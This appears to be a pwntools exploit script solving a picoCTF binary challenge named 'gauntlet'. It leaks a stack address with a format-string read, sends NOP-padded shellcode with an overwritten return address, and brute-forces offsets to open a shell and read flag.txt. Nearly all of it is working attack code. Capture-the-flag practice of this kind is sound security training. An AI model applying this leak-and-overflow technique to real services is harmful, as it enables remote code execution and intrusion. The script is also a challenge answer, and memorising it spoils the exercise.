from pwn import *
elf = ELF('/home/kali/Downloads/gauntlet')
p=elf.process()
context.arch = 'amd64'
import time
cyberedu = 'wily-courier.picoctf.net:56417'

ip, port = cyberedu.split(':')
port = int(port)

#gdb.attach(p, gdbscript="b * 0x40071C")

def try_offset(i):
    try:
        p = remote(ip, port)
        p.sendline(b"%6$p")
        dest = p.recvline()
        dest = int(dest, 16)
    
        dest = dest - 0x100 - i
        #print(f"hello i am dest i am {hex(dest)}")
        shell = asm(shellcraft.sh())
        shell = shell.ljust(120, b'\x90')

        #108 + 4(gid) + 8(stream) + 8(s)

        payload = shell
        payload += p64(dest)
        p.sendline(payload)
        p.sendline(b'cat flag.txt')
        data = p.recvall(timeout=3)
        print(f"data for offset {i}: {data}")
        if b'Segmentation' not in data and b'Illegal' not in data:
            log.failure(f"INTERESTING AT {hex(i)}!")
            
        
    except EOFError:
        pass


for i in range(0x0, 0x101):
    try_offset(i)
